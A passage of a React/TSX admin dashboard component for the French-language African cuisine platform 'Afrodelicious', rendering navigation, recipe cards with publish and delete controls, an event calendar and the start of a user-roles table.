                  { id: 'security_audit', label: 'Sécurité & Audit Hacker', icon: ShieldCheck, badge: 'A+ 99%' },
                  { id: 'faqs', label: 'Helps & FAQs', icon: HelpCircle },
                ].map((item) => {
                  const Icon = item.icon;
                  const isActive = activeTab === item.id;
                  return (
                    <button
                      key={item.id}
                      type="button"
                      onClick={() => setActiveTab(item.id as AdminTab)}
                      className={`w-full flex items-center justify-between px-3.5 py-2.5 rounded-2xl text-xs font-bold transition-all text-left group ${
                        isActive
                          ? 'bg-slate-900 text-white shadow-xs font-black'
                          : 'text-slate-600 hover:text-slate-900 hover:bg-slate-50'
                      }`}
                    >
                      <div className="flex items-center gap-3">
                        <Icon className={`w-4 h-4 ${isActive ? 'text-amber-400' : 'text-slate-400 group-hover:text-slate-600'}`} />
                        <span>{item.label}</span>
                      </div>
                      {item.badge && (
                        <span className={`px-2 py-0.5 rounded-full text-[10px] font-black ${
                          isActive ? 'bg-amber-400 text-slate-950' : 'bg-slate-100 text-slate-600'
                        }`}>
                          {item.badge}
                        </span>
                      )}
                    </button>
                  );
                })}

                <button
                  type="button"
                  onClick={onClose}
                  className="w-full flex items-center gap-3 px-3.5 py-2.5 rounded-2xl text-xs font-bold text-rose-600 hover:bg-rose-50 transition-all text-left"
                >
                  <LogOut className="w-4 h-4" />
                  <span>Quitter l'Admin</span>
                </button>
              </div>

            </div>

            {/* Bottom Culinary Graphic (matching cute illustrated chef in reference mockup) */}
            <div className="p-4 m-3 rounded-2xl bg-gradient-to-br from-orange-50 via-amber-50 to-orange-100 border border-orange-200/80 text-center relative overflow-hidden">
              <div className="relative z-10 space-y-1">
                <span className="text-[10px] font-black uppercase tracking-wider text-[#FF4E27] block">
                  Afrodelicious Kitchen AI
                </span>
                <p className="text-xs font-bold text-slate-800">
                  Transmettez l'excellence des terroirs
                </p>
                <p className="text-[10px] text-slate-500">
                  Version Admin 3.2 · Tous les modules synchronisés
                </p>
              </div>
            </div>

          </aside>

          {/* ============================================================ */}
          {/* MAIN CONTENT AREA                                            */}
          {/* ============================================================ */}
          <main className="flex-1 flex flex-col bg-[#FAF9F6] overflow-hidden">
            
            {/* Top Navigation Search Bar (Matching reference header) */}
            <header className="px-6 py-3.5 bg-white border-b border-slate-200 flex items-center justify-between gap-4 shrink-0">
              
              {/* Search input with icon */}
              <div className="relative flex-1 max-w-md">
                <Search className="w-4 h-4 text-slate-400 absolute left-3.5 top-1/2 -translate-y-1/2 pointer-events-none" />
                <input
                  type="text"
                  placeholder="What would you like to manage? (Recettes, utilisateurs, commandes...)"
                  value={searchQuery}
                  onChange={(e) => setSearchQuery(e.target.value)}
                  className="w-full pl-10 pr-4 py-2 rounded-2xl bg-slate-50 hover:bg-slate-100/80 focus:bg-white border border-slate-200 text-xs font-medium text-slate-800 placeholder-slate-400 focus:outline-none focus:border-[#FF4E27] transition-all"
                />
              </div>

              {/* Center Quick Navigation Shortcuts */}
              <div className="hidden lg:flex items-center gap-3 text-xs font-bold text-slate-600">
                <button
                  type="button"
                  onClick={() => setActiveTab('grocery_list')}
                  className={`flex items-center gap-1.5 px-3 py-1.5 rounded-xl transition-all ${
                    activeTab === 'grocery_list' ? 'text-[#FF4E27] bg-orange-50' : 'hover:text-slate-900'
                  }`}
                >
                  <ShoppingBag className="w-3.5 h-3.5" />
                  <span>Grocery List</span>
                </button>
                <button
                  type="button"
                  onClick={() => setActiveTab('saved_recipes')}
                  className={`flex items-center gap-1.5 px-3 py-1.5 rounded-xl transition-all ${
                    activeTab === 'saved_recipes' ? 'text-[#FF4E27] bg-orange-50 font-black' : 'hover:text-slate-900'
                  }`}
                >
                  <Bookmark className="w-3.5 h-3.5" />
                  <span>Recipe Box</span>
                </button>
                <button
                  type="button"
                  onClick={() => setActiveTab('feature_flags')}
                  className={`flex items-center gap-1.5 px-3 py-1.5 rounded-xl transition-all ${
                    activeTab === 'feature_flags' ? 'text-emerald-700 bg-emerald-50 font-black' : 'hover:text-slate-900'
                  }`}
                >
                  <SlidersHorizontal className="w-3.5 h-3.5 text-emerald-600" />
                  <span>Feature Flags ({Object.values(activeFeatureFlags).filter(Boolean).length})</span>
                </button>
              </div>

              {/* Right Profile & Alerts */}
              <div className="flex items-center gap-3 shrink-0">
                <button
                  type="button"
                  onClick={() => setActiveTab('messaging')}
                  className="relative p-2 rounded-xl text-slate-500 hover:text-slate-900 hover:bg-slate-100 transition-colors"
                  title="Notifications & Messagerie interne"
                >
                  <Bell className="w-4 h-4" />
                  <span className="absolute top-1 right-1 w-2 h-2 rounded-full bg-[#FF4E27] ring-2 ring-white" />
                </button>
                <button
                  type="button"
                  onClick={() => setActiveTab('feature_flags')}
                  className="p-2 rounded-xl text-slate-500 hover:text-slate-900 hover:bg-slate-100 transition-colors"
                  title="Paramètres de configuration"
                >
                  <Settings className="w-4 h-4" />
                </button>
                
                {/* Admin user avatar pill */}
                <div className="flex items-center gap-2 pl-2 border-l border-slate-200">
                  <div className="relative">
                    <img
                      src={currentUser.avatar}
                      alt={currentUser.name}
                      className="w-8 h-8 rounded-full object-cover ring-2 ring-emerald-500"
                    />
                    <span className="absolute bottom-0 right-0 w-2 h-2 rounded-full bg-emerald-500 ring-1 ring-white" />
                  </div>
                  <div className="hidden sm:block text-left">
                    <span className="text-xs font-bold text-slate-900 block leading-tight">
                      {currentUser.name}
                    </span>
                    <span className="text-[10px] text-emerald-700 font-semibold block">
                      Super Admin
                    </span>
                  </div>
                </div>
              </div>

            </header>

            {/* Sub-Header Area with Title, Filter, Sort, Share / Export */}
            <div className="px-6 py-4 bg-white border-b border-slate-200/80 flex flex-wrap items-center justify-between gap-3 shrink-0">
              
              <div className="flex items-center gap-3">
                <h1 className="font-serif font-black text-xl sm:text-2xl text-slate-900 tracking-tight">
                  {activeTab === 'dashboard' && 'Admin Overview & Recettes'}
                  {activeTab === 'calendar' && 'Calendrier des Événements & Masterclasses'}
                  {activeTab === 'users_roles' && 'Gestion des Utilisateurs & Rôles'}
                  {activeTab === 'messaging' && 'Messagerie Interne & Support Direct'}
                  {activeTab === 'analytics' && 'Statistiques & Extractions de Données'}
                  {activeTab === 'feature_flags' && 'Contrôle des Fonctionnalités (Activation / Désactivation)'}
                  {activeTab === 'saved_recipes' && 'Saved Recipes & Boîte à Recettes'}
                  {activeTab === 'delivery' && 'Afrodelicious Delivery Food & Logistique'}
                  {activeTab === 'courses' && 'Masterclasses & Formations Vidéo'}
                  {activeTab === 'experiences' && 'Expériences Culinaires & Tables d\'hôtes'}
                  {activeTab === 'recommended' && 'Restaurants Recommandés & Sponsoring'}
                  {activeTab === 'grocery_list' && 'Liste de Courses & Produits'}
                  {activeTab === 'stories' && 'Stories Vidéo en direct'}
                  {activeTab === 'media_campaigns' && 'Analyses Médias des Campagnes Publicitaires (Kit Média)'}
                  {activeTab === 'security_audit' && 'Sécurité & Audit Pentest (Bouclier Hacker)'}
                  {activeTab === 'faqs' && 'Aide & Documentation'}
                </h1>
                <span className="px-2.5 py-0.5 rounded-full bg-orange-100 text-[#FF4E27] text-xs font-black">
                  {activeTab === 'dashboard' && `${displayRecipes.length} recettes`}
                  {activeTab === 'calendar' && `${calendarEvents.length} événements`}
                  {activeTab === 'users_roles' && `${usersList.length} utilisateurs`}
                  {activeTab === 'feature_flags' && `${Object.keys(activeFeatureFlags).length} modules`}
                  {activeTab === 'security_audit' && 'Score 99.8% (A+)'}
                  {activeTab === 'media_campaigns' && 'Moyenne 90 jours'}
                  {activeTab === 'analytics' && 'Extractions prêtes'}
                  {activeTab === 'messaging' && `${conversations.length} conversations`}
                  {activeTab === 'saved_recipes' && `${recipes.length} sauvegardées`}
                </span>
              </div>

              {/* Action Buttons: Filters, Sort, Export / Share */}
              <div className="flex items-center gap-2">
                <button
                  type="button"
                  className="px-3 py-1.5 rounded-xl border border-slate-200 hover:bg-slate-50 text-slate-700 text-xs font-bold flex items-center gap-1.5 transition-all shadow-2xs"
                >
                  <Filter className="w-3.5 h-3.5 text-slate-400" />
                  <span>Filters</span>
                </button>
                <button
                  type="button"
                  className="px-3 py-1.5 rounded-xl border border-slate-200 hover:bg-slate-50 text-slate-700 text-xs font-bold flex items-center gap-1.5 transition-all shadow-2xs"
                >
                  <ArrowUpDown className="w-3.5 h-3.5 text-slate-400" />
                  <span>Sort</span>
                </button>
                
                {/* Prominent Export / Share Button (matching mockup dark pill) */}
                <button
                  type="button"
                  onClick={() => {
                    if (activeTab === 'analytics') {
                      downloadCsvStats();
                    } else {
                      handleExportPdfReport();
                    }
                  }}
                  className="px-4 py-1.5 rounded-xl bg-slate-900 hover:bg-slate-800 text-white text-xs font-bold flex items-center gap-1.5 shadow-sm transition-all active:scale-95"
                  title="Exporter ou partager"
                >
                  <Share2 className="w-3.5 h-3.5 text-amber-400" />
                  <span>Extraire / Exporter</span>
                </button>
              </div>

            </div>

            {/* Sub-navigation Pills Row (Matching reference horizontal category row) */}
            <div className="px-6 py-2.5 bg-white border-b border-slate-200 flex items-center gap-3 overflow-x-auto scrollbar-none shrink-0 text-xs">
              {[
                { id: 'all', label: 'All Recipes', icon: BookOpen },
                { id: 'breakfast', label: 'Breakfasts', icon: Utensils },
                { id: 'lunch', label: 'Lunches', icon: Clock },
                { id: 'dessert', label: 'Desserts', icon: Sparkles },
                { id: 'dinner', label: 'Dinner', icon: Flame },
                { id: 'sides', label: 'Sides', icon: Layers },
                { id: 'snacks', label: 'Snacks', icon: ShoppingBag },
                { id: 'soups', label: 'Soups', icon: ChefHat },
                { id: 'vegan', label: 'Vegan', icon: Heart }
              ].map(cat => {
                const Icon = cat.icon;
                const isSelected = selectedCategoryPill === cat.id;
                return (
                  <button
                    key={cat.id}
                    type="button"
                    onClick={() => setSelectedCategoryPill(cat.id)}
                    className={`flex items-center gap-1.5 px-3 py-1.5 rounded-xl whitespace-nowrap transition-all font-bold ${
                      isSelected
                        ? 'bg-orange-100 text-[#FF4E27] font-black'
                        : 'text-slate-600 hover:text-slate-900 hover:bg-slate-100'
                    }`}
                  >
                    <Icon className="w-3.5 h-3.5" />
                    <span>{cat.label}</span>
                  </button>
                );
              })}
            </div>

            {/* ============================================================ */}
            {/* TAB CONTENTS                                                 */}
            {/* ============================================================ */}
            <div className="flex-1 p-6 overflow-y-auto space-y-6">

              {/* ========================================================== */}
              {/* TAB 1 & TAB: DASHBOARD & RECIPES (Matching mockup layout)  */}
              {/* ========================================================== */}
              {(activeTab === 'dashboard' || activeTab === 'saved_recipes' || activeTab === 'recently_viewed') && (
                <div className="space-y-6">
                  
                  {/* Quick KPI Ticker */}
                  <div className="grid grid-cols-2 md:grid-cols-4 gap-3 sm:gap-4">
                    <div className="p-4 rounded-2xl bg-white border border-slate-200/90 shadow-2xs">
                      <span className="text-[10px] font-bold text-slate-400 uppercase tracking-wider block">Recettes Actives</span>
                      <div className="flex items-center justify-between mt-1">
                        <span className="text-xl font-black text-slate-900 font-mono">{recipes.length}</span>
                        <span className="text-[11px] font-bold text-emerald-600">+12%</span>
                      </div>
                    </div>
                    <div className="p-4 rounded-2xl bg-white border border-slate-200/90 shadow-2xs">
                      <span className="text-[10px] font-bold text-slate-400 uppercase tracking-wider block">Revenus du Mois</span>
                      <div className="flex items-center justify-between mt-1">
                        <span className="text-xl font-black text-slate-900 font-mono">{ADMIN_STATS_DATA.totalRevenue.toFixed(0)} €</span>
                        <span className="text-[11px] font-bold text-emerald-600">+22.4%</span>
                      </div>
                    </div>
                    <div className="p-4 rounded-2xl bg-white border border-slate-200/90 shadow-2xs">
                      <span className="text-[10px] font-bold text-slate-400 uppercase tracking-wider block">Commissions Livraisons</span>
                      <div className="flex items-center justify-between mt-1">
                        <span className="text-xl font-black text-[#FF4E27] font-mono">{ADMIN_STATS_DATA.commissionsEarned.toFixed(0)} €</span>
                        <span className="text-[11px] font-bold text-emerald-600">Net</span>
                      </div>
                    </div>
                    <div className="p-4 rounded-2xl bg-white border border-slate-200/90 shadow-2xs">
                      <span className="text-[10px] font-bold text-slate-400 uppercase tracking-wider block">Utilisateurs Actifs</span>
                      <div className="flex items-center justify-between mt-1">
                        <span className="text-xl font-black text-slate-900 font-mono">{usersStatus === 'ready' ? usersList.length : '…'}</span>
                        <span className="text-[11px] font-bold text-emerald-600">+14%</span>
                      </div>
                    </div>
                  </div>

                  {/* Media Campaigns Quick Banner */}
                  <div className="p-4 sm:p-5 rounded-3xl bg-gradient-to-r from-slate-950 via-slate-900 to-[#142d20] text-white shadow-md flex flex-col sm:flex-row sm:items-center justify-between gap-4">
                    <div className="flex items-center gap-3.5">
                      <div className="w-11 h-11 rounded-2xl bg-gradient-to-tr from-[#FF4E27] to-[#F59E0B] text-white flex items-center justify-center shrink-0 shadow-md shadow-[#FF4E27]/30">
                        <Megaphone className="w-5 h-5" />
                      </div>
                      <div className="space-y-0.5">
                        <div className="flex items-center gap-2">
                          <span className="text-[10px] font-black uppercase tracking-wider text-amber-400 bg-amber-400/20 px-2 py-0.2 rounded-full">
                            Régie Pub & Media Kit
                          </span>
                          <span className="text-slate-500 text-xs">·</span>
                          <span className="text-xs text-emerald-400 font-semibold">142.8k MAU · 38% USA</span>
                        </div>
                        <h4 className="font-serif font-black text-sm sm:text-base text-white">
                          Analyses Médias des Campagnes Publicitaires (Moyenne 90 jours)
                        </h4>
                        <p className="text-xs text-slate-300">
                          Taux d’engagement 7.8% · Temps passé 3m 48s · Complétion vidéo VCR 68.4% · 6 formats publicitaires actifs.
                        </p>
                      </div>
                    </div>

                    <button
                      type="button"
                      onClick={() => setActiveTab('media_campaigns')}
                      className="px-4 py-2.5 rounded-xl bg-white hover:bg-slate-100 text-slate-900 text-xs font-black transition-all shrink-0 shadow-sm flex items-center gap-1.5 cursor-pointer self-start sm:self-auto active:scale-95"
                    >
                      <span>Ouvrir l'Espace Média</span>
                      <ChevronRight className="w-3.5 h-3.5 text-[#FF4E27]" />
                    </button>
                  </div>

                  {/* Recipe management header: publication filter + refresh */}
                  <div className="flex flex-wrap items-center justify-between gap-2">
                    <div className="flex items-center gap-2 text-xs">
                      {([
                        { id: 'all', label: `Toutes (${recipes.length})` },
                        { id: 'published', label: `Publiées (${recipes.filter(r => r.isPublished).length})` },
                        { id: 'draft', label: `Brouillons (${recipes.filter(r => !r.isPublished).length})` },
                      ] as const).map(f => (
                        <button
                          key={f.id}
                          type="button"
                          onClick={() => setRecipeStatusFilter(f.id)}
                          className={`px-3 py-1.5 rounded-xl font-bold transition-all whitespace-nowrap ${
                            recipeStatusFilter === f.id
                              ? 'bg-slate-900 text-white shadow-xs'
                              : 'bg-white text-slate-700 hover:bg-slate-100 border border-slate-200'
                          }`}
                        >
                          {f.label}
                        </button>
                      ))}
                    </div>
                    {onReloadRecipes && (
                      <button
                        type="button"
                        onClick={onReloadRecipes}
                        className="px-3 py-1.5 rounded-xl bg-white border border-slate-200 text-xs font-bold text-slate-700 hover:bg-slate-100 flex items-center gap-1.5"
                      >
                        <RefreshCw className={`w-3.5 h-3.5 ${recipesStatus === 'loading' ? 'animate-spin' : ''}`} />
                        <span>Actualiser</span>
                      </button>
                    )}
                  </div>

                  {recipesStatus === 'error' && (
                    <div className="p-4 rounded-2xl bg-rose-50 border border-rose-200 text-rose-800 text-xs font-bold flex items-center gap-2">
                      <AlertCircle className="w-4 h-4 text-rose-500" />
                      <span>Impossible de charger les recettes. Cliquez sur « Actualiser » pour réessayer.</span>
                    </div>
                  )}

                  {recipesStatus === 'ready' && displayRecipes.length === 0 && (
                    <div className="py-12 text-center bg-white rounded-3xl border border-slate-200 space-y-2">
                      <Utensils className="w-10 h-10 text-slate-300 mx-auto" />
                      <p className="text-sm font-bold text-slate-900">Aucune recette dans cette vue</p>
                      <p className="text-xs text-slate-500">Utilisez « + Ajouter une Recette » pour créer la première.</p>
                    </div>
                  )}

                  {/* Recipe cards (layout matching the reference mockup) */}
                  <div className="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-3 lg:grid-cols-4 gap-5">
                    {displayRecipes.map((recipe) => (
                      <div
                        key={recipe.id}
                        className="bg-white rounded-3xl border border-slate-200 overflow-hidden shadow-xs hover:shadow-md transition-all group flex flex-col justify-between"
                      >
                        {/* Dish Image */}
                        <div className="relative aspect-[4/3] w-full overflow-hidden bg-slate-100">
                          <img
                            src={recipe.imageUrl}
                            alt={recipe.title}
                            className="w-full h-full object-cover group-hover:scale-105 transition-transform duration-500"
                          />
                          
                          {/* Top pill badge matching mockup `⏱️ 30 mins` */}
                          <div className="absolute bottom-3 left-3 px-2.5 py-1 rounded-full bg-white/95 backdrop-blur-md text-slate-800 text-[11px] font-black shadow-xs flex items-center gap-1">
                            <span>⏱️</span>
                            <span>{recipe.prepTimeMinutes || 30} mins</span>
                          </div>

                          {/* Publication status ribbon */}
                          <div className={`absolute top-3 right-3 px-2.5 py-1 rounded-full text-[10px] font-black shadow-xs ${
                            recipe.isPublished ? 'bg-emerald-500 text-white' : 'bg-amber-400 text-slate-900'
                          }`}>
                            {recipe.isPublished ? 'Publiée' : 'Brouillon'}
                          </div>
                        </div>

                        {/* Card Content matching reference */}
                        <div className="p-4 space-y-1">
                          <h3 className="font-serif font-black text-sm text-slate-900 group-hover:text-[#FF4E27] transition-colors line-clamp-1">
                            {recipe.title}
                          </h3>
                          <div className="flex items-center justify-between text-xs text-slate-500">
                            <span className="text-slate-400 font-medium">
                              {recipe.countryFlag} {recipe.category || 'Spécialité Afro'}
                            </span>
                            <span className="font-bold text-amber-500 flex items-center gap-0.5">
                              ⭐ {recipe.rating || 4.9}
                            </span>
                          </div>
                        </div>

                        {/* Admin Action footer */}
                        <div className="px-3 py-2.5 bg-slate-50 border-t border-slate-100 flex items-center justify-between gap-1 text-[11px] text-slate-600">
                          <span className="font-bold truncate">{recipe.authorName.split(' ')[0]}</span>
                          <div className="flex items-center gap-1 shrink-0">
                            {recipeActionId === recipe.id ? (
                              <RefreshCw className="w-3.5 h-3.5 animate-spin text-slate-400" aria-label="En cours" />
                            ) : (
                              <>
                                {recipe.isPublished && onPreviewRecipe && (
                                  <button
                                    type="button"
                                    onClick={() => onPreviewRecipe(recipe.id)}
                                    title="Voir la recette"
                                    aria-label={`Voir ${recipe.title}`}
                                    className="p-1.5 rounded-lg hover:bg-slate-200 text-slate-500 hover:text-slate-800"
                                  >
                                    <Eye className="w-3.5 h-3.5" />
                                  </button>
                                )}
                                <button
                                  type="button"
                                  onClick={() => onEditRecipe?.(recipe)}
                                  title="Modifier"
                                  aria-label={`Modifier ${recipe.title}`}
                                  className="p-1.5 rounded-lg hover:bg-slate-200 text-slate-500 hover:text-slate-800"
                                >
                                  <Edit3 className="w-3.5 h-3.5" />
                                </button>
                                <button
                                  type="button"
                                  onClick={() => handleTogglePublish(recipe)}
                                  title={recipe.isPublished ? 'Dépublier' : 'Publier'}
                                  className={`px-2 py-1 rounded-lg text-[10px] font-black ${
                                    recipe.isPublished
                                      ? 'bg-slate-200 text-slate-700 hover:bg-slate-300'
                                      : 'bg-emerald-600 text-white hover:bg-emerald-700'
                                  }`}
                                >
                                  {recipe.isPublished ? 'Dépublier' : 'Publier'}
                                </button>
                                <button
                                  type="button"
                                  onClick={() => handleDelete(recipe)}
                                  title="Supprimer"
                                  aria-label={`Supprimer ${recipe.title}`}
                                  className="p-1.5 rounded-lg hover:bg-rose-100 text-slate-500 hover:text-rose-600"
                                >
                                  <Trash2 className="w-3.5 h-3.5" />
                                </button>
                              </>
                            )}
                          </div>
                        </div>
                      </div>
                    ))}
                  </div>

                </div>
              )}

              {/* ========================================================== */}
              {/* TAB 2: CALENDRIER (Ajoute un calendrier)                    */}
              {/* ========================================================== */}
              {activeTab === 'calendar' && (
                <div className="space-y-6">
                  
                  {/* Calendar Top Controls */}
                  <div className="p-5 rounded-3xl bg-white border border-slate-200 shadow-xs flex flex-col sm:flex-row sm:items-center justify-between gap-4">
                    <div className="flex items-center gap-3">
                      <div className="p-3 rounded-2xl bg-amber-500 text-slate-950 font-black shadow-md shadow-amber-500/20">
                        <CalendarDays className="w-6 h-6" />
                      </div>
                      <div>
                        <h2 className="font-serif font-black text-lg text-slate-900">
                          Calendrier Culinaire & Programmation des Événements
                        </h2>
                        <p className="text-xs text-slate-500">
                          Planifiez les Masterclasses en direct, tables d'hôtes et livraisons groupées des chefs.
                        </p>
                      </div>
                    </div>

                    <div className="flex items-center gap-2">
                      <button
                        type="button"
                        onClick={() => setIsAddEventModalOpen(true)}
                        className="px-4 py-2 rounded-2xl bg-[#FF4E27] hover:bg-[#E03814] text-white text-xs font-black shadow-md flex items-center gap-1.5 transition-all active:scale-95 cursor-pointer"
                      >
                        <Plus className="w-4 h-4" />
                        <span>Planifier un Événement</span>
                      </button>
                    </div>
                  </div>

                  {/* Calendar Grid + Upcoming Events Two-Column Layout */}
                  <div className="grid grid-cols-1 lg:grid-cols-12 gap-6">
                    
                    {/* Left 7 Cols: Interactive Calendar Grid */}
                    <div className="lg:col-span-7 bg-white rounded-3xl p-6 border border-slate-200 shadow-xs space-y-4">
                      
                      <div className="flex items-center justify-between pb-3 border-b border-slate-100">
                        <span className="font-serif font-black text-base text-slate-900">
                          Octobre 2026
                        </span>
                        <div className="flex items-center gap-1 text-xs font-bold">
                          <button className="px-2.5 py-1 rounded-xl bg-slate-100 hover:bg-slate-200 text-slate-700">‹ Préc</button>
                          <button className="px-2.5 py-1 rounded-xl bg-orange-50 text-[#FF4E27]">Aujourd'hui</button>
                          <button className="px-2.5 py-1 rounded-xl bg-slate-100 hover:bg-slate-200 text-slate-700">Suiv ›</button>
                        </div>
                      </div>

                      {/* Days Header */}
                      <div className="grid grid-cols-7 gap-2 text-center text-xs font-bold text-slate-400">
                        <span>Lun</span>
                        <span>Mar</span>
                        <span>Mer</span>
                        <span>Jeu</span>
                        <span>Ven</span>
                        <span>Sam</span>
                        <span>Dim</span>
                      </div>

                      {/* Month Days Grid */}
                      <div className="grid grid-cols-7 gap-2">
                        {Array.from({ length: 31 }, (_, i) => {
                          const dayNum = i + 1;
                          const dateStr = `2026-10-${dayNum < 10 ? '0' + dayNum : dayNum}`;
                          const dayEvents = calendarEvents.filter(e => e.date === dateStr);
                          const isSelected = selectedCalendarDate === dateStr;

                          return (
                            <div
                              key={dayNum}
                              onClick={() => setSelectedCalendarDate(dateStr)}
                              className={`min-h-[70px] p-1.5 rounded-2xl border transition-all cursor-pointer flex flex-col justify-between ${
                                isSelected 
                                  ? 'border-[#FF4E27] bg-orange-50/60 ring-2 ring-[#FF4E27]/20 shadow-xs' 
                                  : 'border-slate-100 hover:border-slate-300 bg-white'
                              }`}
                            >
                              <div className="flex items-center justify-between">
                                <span className={`text-xs font-bold ${isSelected ? 'text-[#FF4E27]' : 'text-slate-800'}`}>
                                  {dayNum}
                                </span>
                                {dayEvents.length > 0 && (
                                  <span className="w-2 h-2 rounded-full bg-emerald-500" />
                                )}
                              </div>

                              <div className="space-y-1 mt-1">
                                {dayEvents.map(ev => (
                                  <div
                                    key={ev.id}
                                    className="p-1 rounded bg-[#0F3E2E] text-white text-[9px] font-bold truncate leading-tight"
                                    title={ev.title}
                                  >
                                    {ev.time} {ev.title}
                                  </div>
                                ))}
                              </div>
                            </div>
                          );
                        })}
                      </div>

                    </div>

                    {/* Right 5 Cols: Events Schedule Detail */}
                    <div className="lg:col-span-5 bg-white rounded-3xl p-6 border border-slate-200 shadow-xs space-y-4">
                      
                      <div className="flex items-center justify-between pb-3 border-b border-slate-100">
                        <h3 className="font-serif font-black text-sm text-slate-900">
                          Événements du {selectedCalendarDate} ({calendarEvents.filter(e => e.date === selectedCalendarDate).length})
                        </h3>
                        <span className="text-xs text-slate-400 font-mono">Date sélectionnée</span>
                      </div>

                      {calendarEvents.filter(e => e.date === selectedCalendarDate).length === 0 ? (
                        <div className="py-12 text-center text-slate-400 space-y-2">
                          <CalendarIcon className="w-10 h-10 text-slate-300 mx-auto" />
                          <p className="text-xs font-bold">Aucun événement planifié à cette date.</p>
                          <button
                            type="button"
                            onClick={() => {
                              setNewEventDate(selectedCalendarDate);
                              setIsAddEventModalOpen(true);
                            }}
                            className="px-3 py-1.5 rounded-xl bg-orange-50 text-[#FF4E27] text-xs font-bold hover:bg-orange-100"
                          >
                            + Créer un événement
                          </button>
                        </div>
                      ) : (
                        <div className="space-y-3">
                          {calendarEvents.filter(e => e.date === selectedCalendarDate).map(ev => (
                            <div
                              key={ev.id}
                              className="p-4 rounded-2xl bg-slate-50 border border-slate-200 space-y-2"
                            >
                              <div className="flex items-center justify-between">
                                <span className="px-2 py-0.5 rounded-lg bg-[#FF4E27]/10 text-[#FF4E27] text-[10px] font-black uppercase">
                                  {ev.type}
                                </span>
                                <span className="text-xs font-mono font-bold text-slate-600">
                                  🕒 {ev.time}
                                </span>
                              </div>
                              <h4 className="font-bold text-xs text-slate-900">
                                {ev.title}
                              </h4>
                              <div className="flex items-center justify-between text-[11px] text-slate-500">
                                <span>Animateur : {ev.hostName}</span>
                                <span>{ev.attendeesCount} / {ev.maxCapacity} inscrits</span>
                              </div>
                              {ev.price && (
                                <div className="text-right text-xs font-black text-emerald-600">
                                  {ev.price.toFixed(2)} €
                                </div>
                              )}
                            </div>
                          ))}
                        </div>
                      )}

                      {/* General Upcoming List */}
                      <div className="pt-4 border-t border-slate-100 space-y-2">
                        <span className="text-[11px] font-bold text-slate-400 uppercase tracking-wider block">
                          Toutes les prochaines sessions ({calendarEvents.length})
                        </span>
                        <div className="space-y-2 max-h-56 overflow-y-auto pr-1">
                          {calendarEvents.map(ev => (
                            <div key={ev.id} className="p-2.5 rounded-xl border border-slate-100 hover:bg-slate-50 flex items-center justify-between text-xs">
                              <div>
                                <span className="font-bold text-slate-800 block truncate max-w-[200px]">{ev.title}</span>
                                <span className="text-[10px] text-slate-400">{ev.date} à {ev.time} · {ev.hostName}</span>
                              </div>
                              <span className="px-2 py-0.5 rounded bg-emerald-100 text-emerald-800 text-[10px] font-bold">
                                {ev.status}
                              </span>
                            </div>
                          ))}
                        </div>
                      </div>

                    </div>

                  </div>

                </div>
              )}

              {/* ========================================================== */}
              {/* TAB 3: USERS ROLE (Des Users role)                         */}
              {/* ========================================================== */}
              {activeTab === 'users_roles' && (
                <div className="space-y-6">
                  
                  {/* Header Banner */}
                  <div className="p-5 rounded-3xl bg-white border border-slate-200 shadow-xs flex flex-col sm:flex-row sm:items-center justify-between gap-4">
                    <div className="flex items-center gap-3">
                      <div className="p-3 rounded-2xl bg-[#0F3E2E] text-white font-black shadow-md shadow-[#0F3E2E]/25">
                        <Users className="w-6 h-6" />
                      </div>
                      <div>
                        <h2 className="font-serif font-black text-lg text-slate-900">
                          Gestion des Rôles & Permissions Utilisateurs
                        </h2>
                        <p className="text-xs text-slate-500">
                          Consultez les comptes inscrits et attribuez les rôles (Administrateur ou Membre). Les modifications sont vérifiées côté serveur.
                        </p>
                      </div>
                    </div>

                    {userRoleEditSuccess && (
                      <span className="px-3 py-1.5 rounded-xl bg-emerald-100 text-emerald-800 text-xs font-bold animate-fade-in flex items-center gap-1.5">
                        <CheckCircle2 className="w-4 h-4 text-emerald-600" />
                        <span>{userRoleEditSuccess}</span>
                      </span>
                    )}
                  </div>

                  {/* Role Filter Chips */}
                  <div className="flex items-center gap-2 overflow-x-auto pb-1 text-xs">
                    {[
                      { id: 'all', label: `Tous les utilisateurs (${usersList.length})` },
                      { id: 'admin', label: `Administrateurs (${usersList.filter(u => u.role === 'admin').length})` },
                      { id: 'member', label: `Membres (${usersList.filter(u => u.role === 'member').length})` },
                    ].map(r => (
                      <button
                        key={r.id}
                        type="button"
                        onClick={() => setSelectedRoleFilter(r.id)}
                        className={`px-3 py-1.5 rounded-xl font-bold transition-all whitespace-nowrap ${
                          selectedRoleFilter === r.id
                            ? 'bg-slate-900 text-white shadow-xs'
                            : 'bg-white text-slate-700 hover:bg-slate-100 border border-slate-200'
                        }`}
                      >
                        {r.label}
                      </button>
                    ))}
                  </div>

                  {/* Users Table */}
                  <div className="bg-white rounded-3xl border border-slate-200 overflow-hidden shadow-xs">
                    <div className="overflow-x-auto">
                      <table className="w-full text-left text-xs">
                        <thead className="bg-slate-50 border-b border-slate-200 text-slate-500 font-bold uppercase tracking-wider text-[10px]">
                          <tr>
                            <th className="py-3 px-4">Utilisateur</th>
                            <th className="py-3 px-3">Contact & Pays</th>
                            <th className="py-3 px-3">Rôle Attribué (Éditable)</th>
                            <th className="py-3 px-3">Permissions Clés</th>
                            <th className="py-3 px-3">Statut</th>
                            <th className="py-3 px-4 text-right">Actions</th>
                          </tr>
                        </thead>
                        <tbody className="divide-y divide-slate-100 font-medium">
                          {usersStatus !== 'ready' && (
                            <tr>
                              <td colSpan={6} className="py-8 px-4 text-center text-xs text-slate-500">
                                {usersStatus === 'loading' ? (
                                  <span className="inline-flex items-center gap-2">
                                    <RefreshCw className="w-3.5 h-3.5 animate-spin" />
                                    Chargement des utilisateurs…
                                  </span>
                                ) : (
                                  <span className="inline-flex items-center gap-2 text-rose-700 font-bold">
                                    <AlertCircle className="w-4 h-4" />
                                    {usersError}
                                    <button type="button" onClick={loadUsers} className="underline">Réessayer</button>
                                  </span>
                                )}
                              </td>
                            </tr>
                          )}
                          {usersStatus === 'ready' && usersList
                            .filter(u => selectedRoleFilter === 'all' || u.role === selectedRoleFilter)
                            .map(user => (
                              <tr key={user.id} className="hover:bg-slate-50/70 transition-colors">
                                <td className="py-3 px-4">
                                  <div className="flex items-center gap-3">
                                    <img
                                      src={user.avatar}
                                      alt={user.name}
                                      className="w-9 h-9 rounded-full object-cover ring-2 ring-slate-100 shrink-0"
                                    />
                                    <div>
                                      <span className="font-bold text-slate-900 block">{user.name}</span>
                                      <span className="text-[10px] text-slate-400 font-mono">{user.handle}</span>
                                    </div>
                                  </div>
                                </td>

